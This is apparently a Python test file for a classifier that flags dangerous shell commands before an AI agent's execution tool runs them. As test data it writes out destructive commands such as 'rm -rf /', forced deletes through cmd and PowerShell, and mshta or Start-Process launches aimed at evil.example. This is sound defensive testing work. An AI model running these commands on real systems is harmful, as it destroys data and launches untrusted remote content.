# © 2026 IHUI AI (智汇AI) · 版权所有者: 李春川 (Li Chunchuan) · https://aizhs.top
# Provenance-watermarked. 未授权商用可被溯源追责 (Apache-2.0 须保留本声明与 NOTICE)。
# [IHUI-AI-PROVENANCE]:⁠​‌​​‌​​‌‍‍​‌​​‌​​​‍‍​‌​‌​‌​‌‍‍​‌​​‌​​‌‍‍​​‌​‌‌​‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌​​‌‌‌‌​‌​‍‍‌‌​‌‌​​​‌​​​‌‌‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌‌​‌​​‌‌‌​‍‍‌‌​​‌‌​​​‌​​‌​‌‍‍‌​‌‌‌​‌‌‌​‌‌‌​‌‍‍‌​‌‌​‌‌‌‍‍​‌​​‌‌​​‍‍​‌​​​​‌‌‍‍‌​‌‌​‌‌‌‍‍​‌‌​​​​‌‍‍​‌‌​‌​​‌‍‍​‌‌‌‌​‌​‍‍​‌‌​‌​​​‍‍​‌‌‌​​‌‌‍‍​​‌​‌‌‌​‍‍​‌‌‌​‌​​‍‍​‌‌​‌‌‌‌‍‍​‌‌‌​​​​‍‍‌​‌‌​‌‌‌‍‍​‌​‌​​​​‍‍​‌​‌​​‌​‍‍​‌​​‌‌‌‌‍‍​‌​‌​‌‌​‍‍​‌​​​‌​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​‌‌‍‍​‌​​​‌​‌‍‍​​‌​‌‌​‌‍‍​​‌‌​​‌​‍‍​​‌‌​​​​‍‍​​‌‌​​‌​‍‍​​‌‌​‌‌​⁠
"""第二十一批测试:command_safety 危险命令分类器(对标 codex command_safety 测试矩阵)。"""

from __future__ import annotations

from app.core.command_safety import (
    dangerous_command_match,
    dangerous_powershell_words_match,
)

P = "windows"  # 测试统一指定平台语义,避免宿主差异


def _c(*args: str) -> list[str]:
    return list(args)


# ── POSIX: rm force 系列(codex rm_args_include_force 语义) ──────────────

def test_rm_rf_is_dangerous():
    assert dangerous_command_match(_c("rm", "-rf", "/"), "posix") == "forced_rm"


def test_rm_f_solo_path_dangerous():
    assert dangerous_command_match(_c("rm", "-f", "/"), "posix") == "forced_rm"


def test_rm_reversed_flags_dangerous():
    # 参数重排:force 旗标在路径之后也要命中
    assert dangerous_command_match(_c("rm", "/tmp/example", "-f"), "posix") == "forced_rm"
    assert dangerous_command_match(_c("rm", "-r", "-f", "/tmp/example"), "posix") == "forced_rm"
    assert dangerous_command_match(_c("rm", "--force", "/tmp/example"), "posix") == "forced_rm"


def test_rm_no_force_safe():
    assert dangerous_command_match(_c("rm", "-r", "/tmp/example"), "posix") is None
    assert dangerous_command_match(_c("rm", "file.txt"), "posix") is None


def test_rm_dashdash_filename_not_force():
    # -- 之后的 -f 是文件名,不是旗标
    assert dangerous_command_match(_c("rm", "--", "-f"), "posix") is None


def test_sudo_passthrough():
    assert dangerous_command_match(_c("sudo", "rm", "-rf", "/tmp/example"), "posix") == "forced_rm"


def test_env_prefix_passthrough():
    # env 前置赋值穿越
    assert (
        dangerous_command_match(_c("env", "TARGET=/tmp/x", "rm", "-rf", "/tmp/example"), "posix")
        == "forced_rm"
    )
    assert dangerous_command_match(_c("env", "--", "rm", "-rf", "/tmp/x"), "posix") == "forced_rm"
    # env -i 之后无命令 → 安全
    assert dangerous_command_match(_c("env", "-i"), "posix") is None


def test_trap_action_is_shell_source():
    assert dangerous_command_match(_c("trap", "rm -rf /tmp/x", "EXIT"), "posix") == "forced_rm"


def test_shell_script_literal_commands():
    # bash -c 脚本内的字面量命令逐段判定
    assert dangerous_command_match(_c("bash", "-c", "echo hi && rm -rf /tmp/x"), "posix") == "forced_rm"
    assert dangerous_command_match(_c("sh", "-c", "rm -rf /"), "posix") == "forced_rm"
    assert dangerous_command_match(_c("bash", "-c", "echo safe; git status"), "posix") is None


def test_wrapper_depth_limit():
    # 超过 8 层嵌套包装 → 直接判 Other(防御深度)
    nested = "rm -rf /tmp/x"
    for _ in range(10):
        nested = f"bash -c {shlex_quote(nested)}"
    assert dangerous_command_match(_c("bash", "-c", nested), "posix") == "other"


def test_posix_safe_commands():
    assert dangerous_command_match(_c("git", "push", "origin", "main"), "posix") is None
    assert dangerous_command_match(_c("echo", "hello", "&&", "ls"), "posix") is None
    assert dangerous_command_match(_c("rm"), "posix") is None


def test_windows_exe_name_normalization():
    # 路径/后缀/盘符归一: C:\Tools\rm.exe 也要命中
    assert dangerous_command_match(_c("C:\\Tools\\rm.exe", "-rf", "/"), P) == "forced_rm"


# ── Windows: cmd /c 系列 ────────────────────────────────────────────────

def test_cmd_embedded_operator_force_delete():
    # 内嵌 & 拼接: echo hi&del /f x
    assert dangerous_command_match(_c("cmd", "/c", "echo hi&del /f x"), P) == "other"


def test_cmd_rd_s_q_dangerous():
    assert dangerous_command_match(_c("cmd", "/c", "rd /s /q C:\\tmp\\x"), P) == "other"
    assert dangerous_command_match(_c("cmd", "/c", "rmdir /s /q ."), P) == "other"


def test_cmd_rd_without_q_safe():
    # /s 无 /q → 不命中(codex 语义要求同时具备)
    assert dangerous_command_match(_c("cmd", "/c", "rd /s C:\\tmp\\x"), P) is None


def test_cmd_del_without_f_safe():
    assert dangerous_command_match(_c("cmd", "/c", "del C:\\x.txt"), P) is None
    assert dangerous_command_match(_c("cmd", "/c", "del /p C:\\x.txt"), P) is None


def test_cmd_start_url_dangerous():
    assert dangerous_command_match(_c("cmd", "/c", "start https://evil.example"), P) == "other"


def test_cmd_flags_before_c_skipped():
    # /c 之前的 cmd 自身旗标(/q /v:off /s 等)要跳过
    assert dangerous_command_match(_c("cmd", "/q", "/s", "/c", "del /f C:\\x"), P) == "other"


# ── Windows: GUI 拉起/浏览器/URL ─────────────────────────────────────────

def test_gui_launch_with_url_dangerous():
    assert dangerous_command_match(_c("explorer", "https://evil.example"), P) == "other"
    assert dangerous_command_match(_c("mshta", "http://evil.example/x.hta"), P) == "other"
    assert dangerous_command_match(_c("chrome", "https://evil.example"), P) == "other"
    assert (
        dangerous_command_match(_c("rundll32", "url.dll,fileprotocolhandler", "https://x.example"), P)
        == "other"
    )


def test_gui_launch_without_url_safe():
    assert dangerous_command_match(_c("explorer", "C:\\Windows"), P) is None
    assert dangerous_command_match(_c("mshta", "C:\\x.hta"), P) is None
    assert dangerous_command_match(_c("chrome"), P) is None


# ── Windows: PowerShell 系列 ────────────────────────────────────────────

def test_powershell_force_delete_dangerous():
    assert (
        dangerous_command_match(_c("powershell", "-Command", "Remove-Item -Force C:\\x"), P)
        == "other"
    )
    assert (
        dangerous_command_match(_c("pwsh", "-c", "Get-ChildItem | Remove-Item -Force"), P)
        == "other"
    )
    # -Force: 带参形式
    assert (
        dangerous_command_match(_c("powershell", "-Command", "ri -Force:$true C:\\x"), P)
        == "other"
    )


def test_powershell_delete_without_force_safe():
    assert dangerous_command_match(_c("powershell", "-Command", "Remove-Item C:\\x"), P) is None


def test_powershell_start_process_url_dangerous():
    assert (
        dangerous_command_match(_c("powershell", "-Command", "Start-Process 'https://evil.example'"), P)
        == "other"
    )
    # 内嵌括号 URL(单 token 粘连)
    assert (
        dangerous_command_match(_c("powershell", "-Command", "Start-Process('https://evil.example')"), P)
        == "other"
    )


def test_powershell_flags_before_command():
    # PS 内 del 是 Remove-Item 别名,强制删除需 -Force(/f 是 CMD 语法)
    assert (
        dangerous_command_match(
            _c("powershell", "-NoLogo", "-NoProfile", "-NonInteractive", "-Command", "del -Force C:\\x"), P
        )
        == "other"
    )


def test_powershell_word_level_api():
    assert dangerous_powershell_words_match(["start-process", "https://x.example"], P) == "other"
    assert dangerous_powershell_words_match(["Remove-Item", "-Force", "C:\\x"], P) == "other"
    assert dangerous_powershell_words_match(["Remove-Item", "C:\\x"], P) is None
    # 非 Windows 平台语义下恒 None
    assert dangerous_powershell_words_match(["start-process", "https://x.example"], "posix") is None


def test_powershell_segment_separation():
    # 硬分隔符切段:-Force 与删除 cmdlet 必须同段才命中
    assert (
        dangerous_command_match(_c("powershell", "-Command", "Write-Host -Force; Get-Date"), P)
        is None
    )


import shlex as _shlex


def shlex_quote(s: str) -> str:
    return _shlex.quote(s)


# ── 引擎接线:unified_exec 危险命令硬门 ──────────────────────────────────

import os
from typing import Any as _Any

import pytest as _pytest

from app.services.agent_engine import AgentEngine as _AgentEngine


class _FakeLoop21:
    success = True
    stop_reason = "end_turn"
    final_response = "done"
    iterations: list[_Any] = []
    total_duration_ms = 1.0
    total_tokens_used = 1
    checkpoint_id = None
    error = None
    budget = None
    compaction_events: list[_Any] = []

    async def run(self, messages):
        return self

    async def resume_from_checkpoint(self, checkpoint_id):
        return self

    async def interrupt(self, mode="cancel"):
        return None


def _engine21():
    async def factory(spec, host_tools):
        return _FakeLoop21()

    return _AgentEngine(loop_factory=factory)


async def _rpc21(engine, method, params):
    response = await engine.handle_message(
        {"jsonrpc": "2.0", "id": 1, "method": method, "params": params}
    )
    assert response is not None and "error" not in response, response
    return response["result"]


def _find_builtin21(engine, thread, name):
    for definition in engine._builtin_tool_definitions(thread):
        if getattr(definition, "name", "") == name:
            return definition
    raise AssertionError(f"内置工具未注入: {name}")


@_pytest.mark.asyncio
async def test_unified_exec_blocks_dangerous_command():
    """unified_exec 首条危险命令被拦截,回执带 safety 分级,不产生会话。"""
    engine = _engine21()
    started = await _rpc21(engine, "thread.start", {})
    thread = engine._threads[started["threadId"]]
    tool = _find_builtin21(engine, thread, "unified_exec")
    result = await tool.executor({"command": "rm -rf /"})
    assert "error" in result
    assert result["safety"]["classification"] == "forced_rm"
    assert engine._exec_sessions == {}


@_pytest.mark.asyncio
async def test_unified_exec_windows_semantics_applied():
    """Windows 宿主语义:cmd /c 强删被拦截。"""
    engine = _engine21()
    started = await _rpc21(engine, "thread.start", {})
    thread = engine._threads[started["threadId"]]
    tool = _find_builtin21(engine, thread, "unified_exec")
    result = await tool.executor({"command": "cmd /c rd /s /q C:\\tmp\\x"})
    if os.name == "nt":
        assert "error" in result and result["safety"]["classification"] == "other"
    else:
        # POSIX 宿主上 cmd 是普通词,按安全命令放行(平台语义跟宿主走)
        assert "error" not in result
